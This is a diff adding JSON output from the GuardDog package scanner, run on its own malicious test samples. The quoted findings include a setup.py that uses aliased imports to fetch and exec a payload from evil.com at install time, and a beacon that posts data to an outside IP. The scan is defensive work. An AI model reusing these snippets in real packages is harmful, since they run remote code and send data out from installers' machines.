@@ -1,0 +1,205 @@
+{
+ "_nota": "REAL: guarddog v3.2.0 sobre las muestras de test OFICIALES de GuardDog (tests/analyzer/sourcecode/threat-setup-import-aliasing.py como setup.py y threat-network-exfiltration.py), montadas en solo lectura. Nada se ejecutó.",
+ "package": "/muestra",
+ "results": {
+  "capability-filesystem-browser": {},
+  "capability-filesystem-delete": {},
+  "capability-filesystem-read": {},
+  "capability-filesystem-write-executable": {},
+  "capability-network-download": {},
+  "capability-network-lolbas": {},
+  "capability-network-outbound": [
+   {
+    "location": "muestra/__init__.py:7",
+    "code": "def beacon(data):\n    requests.post(\"http://203.0.113.42/collect\", json=data)",
+    "match": "requests.post",
+    "message": "Detects network request capabilities (HTTP, sockets, etc.)"
+   }
+  ],
+  "capability-process-hooks": {},
+  "capability-process-schedule": {},
+  "capability-process-spawn": {},
+  "capability-runtime-clipboard": {},
+  "threat-filesystem-autostart": {},
+  "threat-filesystem-destruction": {},
+  "threat-filesystem-read": {},
+  "threat-network-dns-exfil": {},
+  "threat-network-exfil-messenger": {},
+  "threat-network-exfil-sysinfo": {},
+  "threat-network-exfiltration": [
+   {
+    "location": "muestra/__init__.py:7",
+    "code": "def beacon(data):\n    requests.post(\"http://203.0.113.42/collect\", json=data)",
+    "match": "http://203.0.113.42",
+    "message": "Detects URLs to suspicious domains often used for exfiltration or C2"
+   }
+  ],
+  "threat-network-outbound-shady-links": {},
+  "threat-network-reverse-shell": {},
+  "threat-npm-dependency-confusion": {},
+  "threat-npm-http-dependency": {},
+  "threat-npm-preinstall-script": {},
+  "threat-process-cryptomining": {},
+  "threat-process-download-exec": {},
+  "threat-process-hooks": {},
+  "threat-process-injection-dll": {},
+  "threat-process-memory": {},
+  "threat-process-powershell-encoded": {},
+  "threat-process-spawn-silent": {},
+  "threat-process-sysinfo": {},
+  "threat-runtime-dynamic-loader": {},
+  "threat-runtime-enumeration": {},
+  "threat-runtime-environment-read": {},
+  "threat-runtime-keylogging": {},
+  "threat-runtime-obfuscation": {},
+  "threat-runtime-obfuscation-api": {},
+  "threat-runtime-obfuscation-base64exec": {},
+  "threat-runtime-obfuscation-chr": {},
+  "threat-runtime-obfuscation-dynamic-eval": {},
+  "threat-runtime-obfuscation-general": {},
+  "threat-runtime-obfuscation-hidden-code": {},
+  "threat-runtime-obfuscation-import-exec": {},
+  "threat-runtime-obfuscation-js-mangling": {},
+  "threat-runtime-obfuscation-log-suppress": {},
+  "threat-runtime-obfuscation-pyarmor": {},
+  "threat-runtime-obfuscation-steganography": {},
+  "threat-runtime-obfuscation-unicode": {},
+  "threat-runtime-screencapture": {},
+  "threat-runtime-self-propagation": {},
+  "threat-runtime-system-info": {},
+  "threat-setup-import-aliasing": [
+   {
+    "location": "setup.py:5",
+    "code": "from sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://evil.com/payload').read())\"\"\")",
+    "match": "from os import system as ",
+    "message": "Detects suspicious import aliasing of dangerous functions in setup.py"
+   },
+   {
+    "location": "setup.py:4",
+    "code": "from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)",
+    "match": "from sys import executable as ",
+    "message": "Detects suspicious import aliasing of dangerous functions in setup.py"
+   },
+   {
+    "location": "setup.py:3",
+    "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem",
+    "match": "from tempfile import NamedTemporaryFile as ",
+    "message": "Detects suspicious import aliasing of dangerous functions in setup.py"
+   }
+  ],
+  "threat-setup-network-in-install": {},
+  "threat-setup-suspicious-imports": [
+   {
+    "location": "setup.py:10",
+    "code": "_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nsetup(name='evil-pkg', version='1.0')",
+    "match": "setup(",
+    "message": "Detects suspicious imports in setup.py: network, system, or crypto libraries that have no place in a build script"
+   }
+  ]
+ },
+ "errors": {},
+ "issues": 19,
+ "risk_score": {
+  "score": 8.8,
+  "label": "high_risk",
+  "findings_count": 6,
+  "score_breakdown": {
+   "severity_component": 0.3,
+   "chain_component": 0.14,
+   "specificity_component": 0.3,
+   "sophistication_component": 0.14,
+   "num_stages": 2,
+   "has_source_code_risks": true,
+   "max_severity": 3,
+   "dominant_specificity": "high",
+   "dominant_sophistication": "medium"
+  }
+ },
+ "risks": [
+  {
+   "name": "risk.network.outbound",
+   "category": "network",
+   "severity": "high",
+   "mitre_tactics": [
+    "exfiltration"
+   ],
+   "threat_identifies": "threat.network.outbound",
+   "threat_rule": "threat-network-exfiltration",
+   "threat_description": "Detects URLs to suspicious domains often used for exfiltration or C2",
+   "threat_location": "muestra/__init__.py:7",
+   "threat_code": "def beacon(data):\n    requests.post(\"http://203.0.113.42/collect\", json=data)",
+   "threat_match": "http://203.0.113.42",
+   "capability_identifies": "capability.network.outbound",
+   "capability_rule": "capability-network-outbound",
+   "file_path": "muestra/__init__.py"
+  },
+  {
+   "name": "risk.setup.import",
+   "category": "setup",
+   "severity": "high",
+   "mitre_tactics": [
+    "execution"
+   ],
+   "threat_identifies": "threat.setup.import.aliasing",
+   "threat_rule": "threat-setup-import-aliasing",
+   "threat_description": "Detects suspicious import aliasing of dangerous functions in setup.py",
+   "threat_location": "setup.py:5",
+   "threat_code": "from sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://evil.com/payload').read())\"\"\")",
+   "threat_match": "from os import system as ",
+   "capability_identifies": null,
+   "capability_rule": null,
+   "file_path": "setup.py"
+  },
+  {
+   "name": "risk.setup.import",
+   "category": "setup",
+   "severity": "high",
+   "mitre_tactics": [
+    "execution"
+   ],
+   "threat_identifies": "threat.setup.import.aliasing",
+   "threat_rule": "threat-setup-import-aliasing",
+   "threat_description": "Detects suspicious import aliasing of dangerous functions in setup.py",
+   "threat_location": "setup.py:4",
+   "threat_code": "from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)",
+   "threat_match": "from sys import executable as ",
+   "capability_identifies": null,
+   "capability_rule": null,
+   "file_path": "setup.py"
+  },
+  {
+   "name": "risk.setup.import",
+   "category": "setup",
+   "severity": "high",
+   "mitre_tactics": [
+    "execution"
+   ],
+   "threat_identifies": "threat.setup.import.aliasing",
+   "threat_rule": "threat-setup-import-aliasing",
+   "threat_description": "Detects suspicious import aliasing of dangerous functions in setup.py",
+   "threat_location": "setup.py:3",
+   "threat_code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem",
+   "threat_match": "from tempfile import NamedTemporaryFile as ",
+   "capability_identifies": null,
+   "capability_rule": null,
+   "file_path": "setup.py"
+  },
+  {
+   "name": "risk.setup.import",
+   "category": "setup",
+   "severity": "high",
+   "mitre_tactics": [
+    "execution"
+   ],
+   "threat_identifies": "threat.setup.import.aliasing",
+   "threat_rule": "threat-setup-suspicious-imports",
+   "threat_description": "Detects suspicious imports in setup.py: network, system, or crypto libraries that have no place in a build script",
+   "threat_location": "setup.py:10",
+   "threat_code": "_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nsetup(name='evil-pkg', version='1.0')",
+   "threat_match": "setup(",
+   "capability_identifies": null,
+   "capability_rule": null,
+   "file_path": "setup.py"
+  }
+ ]
+}
